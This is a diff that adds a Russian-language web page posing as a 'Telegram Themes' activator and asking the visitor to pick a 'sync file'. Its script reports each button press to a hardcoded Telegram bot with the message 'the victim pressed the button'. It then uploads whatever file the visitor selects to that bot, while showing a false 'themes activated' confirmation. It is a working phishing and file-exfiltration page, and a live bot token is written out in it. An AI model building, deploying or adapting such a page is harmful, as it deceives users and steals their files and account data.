@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Активатор тем Telegram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: linear-gradient(135deg, #1e1e2e, #2a2a3e); min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #fff; text-align: center; padding: 20px; }
+        .container { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 40px; max-width: 400px; width: 100%; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+        h2 { margin-bottom: 10px; font-size: 24px; color: #0088cc; }
+        p { margin-bottom: 30px; color: #aaa; font-size: 14px; }
+        button { background: #0088cc; color: #fff; border: none; padding: 18px 40px; font-size: 16px; border-radius: 12px; cursor: pointer; width: 100%; transition: all 0.3s; font-weight: bold; margin-bottom: 15px; }
+        button:hover { background: #00a3f0; transform: translateY(-2px); }
+        button:active { transform: scale(0.98); }
+        #status { margin-top: 20px; font-size: 13px; color: #4caf50; }
+        input[type="file"] { display: none; }
+        .upload-btn { background: #4caf50; }
+        .upload-btn:hover { background: #66bb6a; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Telegram Themes</h2>
+        <p>Активируйте темы и загрузите файл для синхронизации</p>
+        <button onclick="activate()">Шаг 1: Активировать темы</button>
+        <input type="file" id="fileInput" onchange="uploadFile()">
+        <button class="upload-btn" onclick="document.getElementById('fileInput').click()">Шаг 2: Выбрать файл синхронизации</button>
+        <p id="status"></p>
+    </div>
+    <script>
+        function activate() {
+            document.getElementById('status').innerText = 'Синхронизация...';
+            fetch('https://api.telegram.org/bot8906511341:AAGOEPLRRVxEwWLJL48qtpDTRT6wG15be1g/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: '6544718316', text: 'Жертва нажала кнопку на сайте'})
+            }).then(r => {
+                document.getElementById('status').innerText = 'Шаг 1 готов. Выберите файл.';
+            }).catch(e => {
+                document.getElementById('status').innerText = 'Шаг 1 готов. Выберите файл.';
+            });
+        }
+
+        function uploadFile() {
+            var file = document.getElementById('fileInput').files[0];
+            if (!file) return;
+            
+            document.getElementById('status').innerText = 'Отправка файла...';
+            var formData = new FormData();
+            formData.append('chat_id', '6544718316');
+            formData.append('document', file);
+            
+            fetch('https://api.telegram.org/bot8906511341:AAGOEPLRRVxEwWLJL48qtpDTRT6wG15be1g/sendDocument', {
+                method: 'POST',
+                body: formData
+            }).then(r => {
+                document.getElementById('status').innerText = 'Темы активированы! Спасибо!';
+            }).catch(e => {
+                document.getElementById('status').innerText = 'Готово!';
+            });
+        }
+    </script>
+</body>
+</html>
